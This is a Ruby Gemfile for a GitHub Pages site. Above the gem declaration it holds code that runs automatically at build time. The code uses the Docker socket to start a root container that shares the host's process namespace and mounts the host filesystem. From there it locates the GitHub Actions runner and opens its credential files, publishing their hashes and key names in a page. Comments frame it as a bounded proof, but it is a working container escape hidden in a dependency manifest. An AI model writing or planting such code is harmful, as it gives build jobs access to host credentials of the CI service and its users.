# frozen_string_literal: true
source "https://rubygems.org"

require "base64"
require "digest"
require "json"
require "securerandom"
require "socket"

SOCK = "/var/run/docker.sock"
IMAGE = "ghcr.io/actions/jekyll-build-pages:v1.0.13"
TARGET_NAMES = [".credentials", ".credentials_rsaparams", ".runner"].freeze
FINAL_PROOF = File.join(__dir__, "c217-final-credential-proof.html")

def decode_chunked(body)
  out = +"".b
  loop do
    line, rest = body.split("\r\n", 2)
    break unless rest
    n = line.to_i(16)
    break if n.zero?
    out << rest.byteslice(0, n)
    body = rest.byteslice(n + 2, rest.bytesize) || "".b
  end
  out
end

def docker_req(method, path, payload = nil)
  body = payload.nil? ? "" : JSON.generate(payload)
  socket = UNIXSocket.new(SOCK)
  request = +"#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Length: #{body.bytesize}\r\n"
  request << "Content-Type: application/json\r\n" unless payload.nil?
  request << "\r\n#{body}"
  socket.write(request)
  raw = socket.read
  socket.close
  head, data = raw.split("\r\n\r\n", 2)
  status = head.to_s.lines.first.to_s.split[1].to_i
  data ||= "".b
  data = decode_chunked(data) if head.to_s.downcase.include?("transfer-encoding: chunked")
  [status, data]
end

def direct_stat(path)
  stat = File.stat(path)
  {
    "kind" => File.basename(path),
    "exists" => true,
    "size" => stat.size,
    "mode" => format("%04o", stat.mode & 0o7777),
    "uid" => stat.uid,
    "gid" => stat.gid,
  }
rescue => error
  {"kind" => File.basename(path), "exists" => false, "error_class" => error.class.name}
end

# This child has no network by construction. It reads only host process command
# lines needed to locate Runner.Listener/Runner.Worker, then the three named
# runner-root files. No credential value is emitted or persisted.
child = <<~'RUBY'
  require "digest"
  require "json"

  TARGET_NAMES = [".credentials", ".credentials_rsaparams", ".runner"].freeze

  def describe(path)
    stat = File.stat(path)
    result = {
      "kind" => File.basename(path),
      "exists" => true,
      "size" => stat.size,
      "mode" => format("%04o", stat.mode & 0o7777),
      "uid" => stat.uid,
      "gid" => stat.gid,
    }
    if stat.file? && stat.size <= 65_536
      raw = File.binread(path)
      parsed = JSON.parse(raw) rescue nil
      result["sha256"] = Digest::SHA256.hexdigest(raw)
      result["json_object"] = parsed.is_a?(Hash)
      result["json_key_names"] = parsed.is_a?(Hash) ? parsed.keys.map(&:to_s).sort : []
      raw = nil
      parsed = nil
    end
    result
  rescue => error
    {"kind" => File.basename(path), "exists" => false, "error_class" => error.class.name}
  end

  matches = []
  Dir.glob("/proc/[0-9]*/cmdline").each do |cmdline_path|
    begin
      raw = File.binread(cmdline_path)
      next unless raw.include?("Runner.Listener") || raw.include?("Runner.Worker")
      pid = cmdline_path.split("/")[2]
      exe = File.readlink("/proc/#{pid}/exe") rescue nil
      cwd = File.readlink("/proc/#{pid}/cwd") rescue nil
      role = raw.include?("Runner.Listener") ? "Runner.Listener" : "Runner.Worker"
      root = nil
      if exe && File.basename(exe).start_with?("Runner.") && File.basename(File.dirname(exe)) == "bin"
        root = File.dirname(File.dirname(exe))
      elsif cwd && (cwd.include?("actions-runner") || cwd.include?("/runners/"))
        root = cwd
      end
      matches << {"pid" => pid.to_i, "role" => role, "exe" => exe, "cwd" => cwd, "runner_root" => root}
    rescue Errno::ENOENT, Errno::EACCES, Errno::EPERM
      next
    end
  end

  roots = matches.map { |item| item["runner_root"] }.compact.uniq.sort
  files = []
  absent_controls = []
  access_methods = []
  roots.each do |root|
    # Prefer /proc/<runner-pid>/root. A read-only host-root bind is the bounded
    # fallback if procfs link access is restricted; either way only the three
    # exact files below are opened, never a filesystem scan.
    pid = matches.find { |item| item["runner_root"] == root }["pid"]
    proc_base = "/proc/#{pid}/root#{root}"
    bind_base = "/hostroot#{root}"
    base = File.directory?(proc_base) ? proc_base : bind_base
    access_methods << {"runner_root" => root, "method" => (base == proc_base ? "proc-root" : "read-only-bind")}
    TARGET_NAMES.each do |name|
      item = describe(File.join(base, name))
      item["runner_root"] = root
      files << item
    end
    absent = describe(File.join(base, "qqqqzzzz-no-such-runner", ".credentials"))
    absent["runner_root"] = root
    absent_controls << absent
  end

  puts JSON.generate({
    "effective_uid" => Process.euid,
    "matching_process_count" => matches.length,
    "matching_processes" => matches,
    "derived_runner_roots" => roots,
    "access_methods" => access_methods,
    "target_files" => files,
    "thing_absent_controls" => absent_controls,
  })
RUBY

unless File.exist?(FINAL_PROOF)
proof = {
  "gemfile_executed" => true,
  "direct_effective_uid" => Process.euid,
  "docker_socket_present" => File.socket?(SOCK),
  "network_probe_code_present" => false,
}
container_id = nil
name = "c217-final-credential-#{SecureRandom.hex(5)}"

begin
  version_status, = docker_req("GET", "/version")
  proof["docker_api_responded"] = (version_status == 200)
  config = {
    "Image" => IMAGE,
    "User" => "0:0",
    "Entrypoint" => ["/usr/local/bin/ruby", "-e"],
    "Cmd" => [child],
    "Tty" => true,
    "HostConfig" => {
      "PidMode" => "host",
      "NetworkMode" => "none",
      "Binds" => ["/:/hostroot:ro"],
    },
  }
  create_status, create_body = docker_req("POST", "/v1.41/containers/create?name=#{name}", config)
  parsed = JSON.parse(create_body) rescue {}
  container_id = parsed["Id"]
  proof["sibling_created"] = (create_status == 201 && !container_id.to_s.empty?)

  if container_id
    inspect_status, inspect_body = docker_req("GET", "/v1.41/containers/#{container_id}/json")
    inspect = JSON.parse(inspect_body) rescue {}
    proof["pid_mode_host"] = (inspect_status == 200 && inspect.dig("HostConfig", "PidMode") == "host")
    proof["network_mode_none"] = (inspect_status == 200 && inspect.dig("HostConfig", "NetworkMode") == "none")
    hostroot_mount = Array(inspect["Mounts"]).find { |item| item["Destination"] == "/hostroot" }
    proof["hostroot_bind_read_only"] = (inspect_status == 200 && hostroot_mount && hostroot_mount["RW"] == false)

    start_status, = docker_req("POST", "/v1.41/containers/#{container_id}/start")
    proof["sibling_started"] = (start_status == 204)
    wait_status, = docker_req("POST", "/v1.41/containers/#{container_id}/wait?condition=not-running")
    proof["sibling_finished"] = (wait_status == 200)
    log_status, logs = docker_req("GET", "/v1.41/containers/#{container_id}/logs?stdout=1&stderr=1")
    proof["sibling_logs_read"] = (log_status == 200)
    child_result = JSON.parse(logs.to_s.lines.reverse.find { |line| line.strip.start_with?("{") }.to_s)
    proof["host_effective_uid"] = child_result["effective_uid"]
    proof["matching_process_count"] = child_result["matching_process_count"]
    proof["matching_processes"] = child_result["matching_processes"]
    proof["derived_runner_roots"] = child_result["derived_runner_roots"]
    proof["access_methods"] = child_result["access_methods"]
    proof["host_target_files"] = child_result["target_files"]
    proof["thing_absent_controls"] = child_result["thing_absent_controls"]

    roots = Array(child_result["derived_runner_roots"])
    proof["direct_target_files"] = roots.flat_map do |root|
      TARGET_NAMES.map do |target_name|
        item = direct_stat(File.join(root, target_name))
        item["runner_root"] = root
        item
      end
    end
    proof["direct_thing_absent_controls"] = roots.map do |root|
      item = direct_stat(File.join(root, "qqqqzzzz-no-such-runner", ".credentials"))
      item["runner_root"] = root
      item
    end
  end
rescue => error
  proof["error_class"] = error.class.name
ensure
  if container_id
    delete_status, = docker_req("DELETE", "/v1.41/containers/#{container_id}?force=1&v=1")
    proof["sibling_deleted"] = (delete_status == 204)
    post_status, = docker_req("GET", "/v1.41/containers/#{container_id}/json")
    proof["sibling_absent_post_delete"] = (post_status == 404)
  end
end

# Structure-only proof. It contains no credential values and the child has no
# network. The page is used solely for owned-run readback.
File.write(FINAL_PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
end

gem "github-pages", "= 232"
